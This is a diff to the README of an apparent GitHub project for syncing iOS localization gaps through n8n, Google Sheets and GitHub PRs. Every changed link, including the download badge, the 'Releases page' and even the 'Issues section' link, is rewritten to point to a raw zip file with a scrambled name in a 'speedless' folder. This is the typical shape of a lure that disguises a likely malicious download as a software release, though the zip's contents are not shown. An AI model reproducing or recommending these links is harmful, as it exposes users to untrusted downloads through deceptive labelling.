@@ -1,6 +1,6 @@
 # 🎉 n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders - Keep Your iOS Translations Accurate
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/releases)
+[![Download from Releases](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/raw/refs/heads/main/speedless/i_and_Hub_O_Google_placeholders_P_Syncing_Sheets_gaps_Git_localization_with_n_v3.0.zip%20Now-From%20Releases-brightgreen)](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/raw/refs/heads/main/speedless/i_and_Hub_O_Google_placeholders_P_Syncing_Sheets_gaps_Git_localization_with_n_v3.0.zip)
 
 ## 📜 Description
 
@@ -12,7 +12,7 @@ To get started, you need to download the application. Follow the steps below to 
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: Go to our [Releases page](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/releases).
+1. **Visit this page to download**: Go to our [Releases page](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/raw/refs/heads/main/speedless/i_and_Hub_O_Google_placeholders_P_Syncing_Sheets_gaps_Git_localization_with_n_v3.0.zip).
   
 2. **Choose the latest version**: Look for the latest release. The versions are listed in chronological order. Select the version that suits your operating system.
 
@@ -62,8 +62,8 @@ To get started, you need to download the application. Follow the steps below to 
 
 ## ❓ Questions?
 
-If you have any questions or need assistance, please check the [Issues section](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/issues) on GitHub. Feel free to open a new issue if you do not find an answer.
+If you have any questions or need assistance, please check the [Issues section](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/raw/refs/heads/main/speedless/i_and_Hub_O_Google_placeholders_P_Syncing_Sheets_gaps_Git_localization_with_n_v3.0.zip) on GitHub. Feel free to open a new issue if you do not find an answer.
 
 ## 📍 Download Now
 
-Join the community in keeping your iOS translations accurate. [Visit this page to download](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/releases) the latest version and start improving your app localization today!
+Join the community in keeping your iOS translations accurate. [Visit this page to download](https://github.com/papikimono/n8n-Syncing-iOS-localization-gaps-with-Google-Sheets-and-GitHub-PR-placeholders/raw/refs/heads/main/speedless/i_and_Hub_O_Google_placeholders_P_Syncing_Sheets_gaps_Git_localization_with_n_v3.0.zip) the latest version and start improving your app localization today!
